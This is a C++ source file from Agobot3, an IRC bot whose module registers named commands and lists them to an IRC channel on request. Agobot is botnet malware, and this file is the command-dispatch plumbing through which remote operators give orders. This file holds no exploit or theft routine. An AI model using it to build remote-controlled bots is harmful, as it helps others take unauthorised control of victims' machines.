/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "commands.h"
#include "mainctrl.h"

CCommands::CCommands() { }
void CCommands::Init()
{	REGCMD(m_cmdList,	"commands.list",	"Lists all available commands",	false,	this); }

void CCommands::RegisterCommand(command *pCommand, const char *szName, const char *szDescription, bool bFallBack, CCommandHandler *pHandler)
{	pCommand->sName.Assign(szName); pCommand->sDescription.Assign(szDescription);
	pCommand->bFallBack=bFallBack; pCommand->pHandler=pHandler; m_lCommands.push_back(pCommand); }
command *CCommands::FindCommandByName(const char *szName, bool bExact)
{	list<command*>::iterator ic; // Cycle through commands and find the string
	for(ic=m_lCommands.begin(); ic!=m_lCommands.end(); ++ic)
		if(!(*ic)->sName.Compare(szName)) return (*ic);
	return NULL; }
command *CCommands::FindFallBack()
{	list<command*>::iterator ic; // Cycle through commands and find the fallback
	for(ic=m_lCommands.begin(); ic!=m_lCommands.end(); ++ic)
		if((*ic)->bFallBack) return (*ic);
	return NULL; }

bool CCommands::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("commands.list"))
	{	g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "-[ command list ]-", pMsg->sReplyTo.Str());
		list<command*>::iterator ic; int iCount=0;
		for(ic=m_lCommands.begin(); ic!=m_lCommands.end(); ++ic)
		{	iCount++; CString sReply; sReply.Format("%d. / \"%s\" / \"%s\"", \
				iCount, (*ic)->sName.CStr(), (*ic)->sDescription.CStr());
			g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
			Sleep(1500); }
		return true; }

	return false; }
